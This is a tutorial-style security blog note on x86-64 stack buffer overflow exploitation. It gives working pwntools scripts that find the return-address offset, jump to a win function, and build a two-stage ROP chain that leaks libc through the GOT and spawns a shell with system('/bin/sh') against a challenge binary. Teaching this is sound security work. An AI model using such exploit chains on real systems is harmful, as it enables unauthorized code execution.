---
number: 6
title: "Buffer Overflow: From Overwrite to Control Hijack"
slug: "buffer-overflow-control-hijack"
date: "2025-04-30"
type: "note"
status: "DISCLOSED"
summary: "A stack overflow isn't a crash - it's a write primitive aimed at the return address. The full path from smashing the stack to a clean ROP-driven shell."
cves: []
severity: "TECHNIQUE"
timeline:
 - { label: "WRITTEN", date: "2025-04-30" }
 - { label: "PUBLISHED", date: "2025-04-30" }
---

Everyone learns "a buffer overflow overwrites memory." Fewer people internalize the part that makes it dangerous: on x86-64 the return address lives on the same stack as your buffer, at a *fixed distance* from it. An overflow isn't undefined chaos - it's a precise write primitive whose target you get to choose. The whole art is turning that write into control of `RIP`.

## The stack, honestly

When `vuln()` is called, the CPU pushes the return address, then the function sets up its frame:

```
higher addresses
  +---------------------+
  |  return address     |  <- what we're aiming for
  +---------------------+
  |  saved RBP          |
  +---------------------+
  |  char buf[64]       |  <- read() writes here, growing UP toward RA
  +---------------------+
lower addresses
```

`read()` fills `buf` from low to high addresses. Write past 64 bytes and you climb straight through saved RBP into the return address. When `vuln()` executes `ret`, the CPU pops whatever you put there into `RIP` and jumps. You didn't corrupt the program - you *reprogrammed* it.

## Find the offset

Never guess the distance. Use a cyclic pattern so the crash tells you exactly how far the return address sits from the start of your input:

```python
from pwn import *

io = process("./chall")
io.sendline(cyclic(200))
io.wait()

core = io.corefile
fault = core.read(core.rsp, 8)          # what got popped near RIP
offset = cyclic_find(fault)
log.success(f"offset to saved RIP = {offset}")   # e.g. 72
```

`cyclic_find` reverses De Bruijn math to hand you the offset directly. This replaces the "add A's until it breaks" ritual with a single deterministic measurement.

## The easy win

If the binary ships a `win()`/`give_shell()` function, control hijack is a one-liner once you have the offset:

```python
payload = flat({offset: p64(exe.symbols["win"])})
io.sendline(payload)
io.interactive()
```

## The real win: ROP

Real targets don't ship a `win()`. With NX enabled the stack is non-executable, so we borrow the code already in the binary - **Return-Oriented Programming**. We chain tiny snippets ending in `ret`, each one popping the next gadget's address off our controlled stack.

```python
libc = exe.libc
rop  = ROP(exe)

# 1) leak a libc address by printing a GOT entry
rop.puts(exe.got["puts"])
rop.call(exe.symbols["vuln"])           # return to vuln for a second payload

io.sendline(flat({offset: rop.chain()}))
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.success(f"libc base = {libc.address:#x}")

# 2) now call system("/bin/sh")
rop2 = ROP(libc)
rop2.raw(rop2.find_gadget(["ret"]))     # stack alignment
rop2.system(next(libc.search(b"/bin/sh\x00")))

io.sendline(flat({offset: rop2.chain()}))
io.interactive()
```

> Two rounds: the first leaks libc through the GOT and loops back into the vulnerable function; the second, now knowing libc's base, calls system. This "leak then loop" pattern is the workhorse of modern stack pwn.

## Mitigations, and why the chain still works

- **Stack canary** - a random value between `buf` and saved RBP; a linear overflow smashes it and `__stack_chk_fail` aborts. Defeat requires *leaking* the canary and writing it back unchanged.
- **NX/DEP** - kills stack shellcode; the reason we ROP instead of jumping to `buf`.
- **PIE/ASLR** - randomizes the base; the reason we need a leak before we can name any gadget.
- **Full RELRO** - read-only GOT; pushes you toward ret2libc rather than GOT overwrite.

Each mitigation removes one shortcut. None of them removes the underlying primitive: *you control the saved return address.* As long as that's true, control hijack is a question of how many hoops, not whether.

## The takeaway

A buffer overflow is a targeted write, and the return address is the highest-value target on the stack. Measure the offset deterministically, aim the write, and when the direct jump is blocked, borrow the program's own code to walk yourself to a shell.
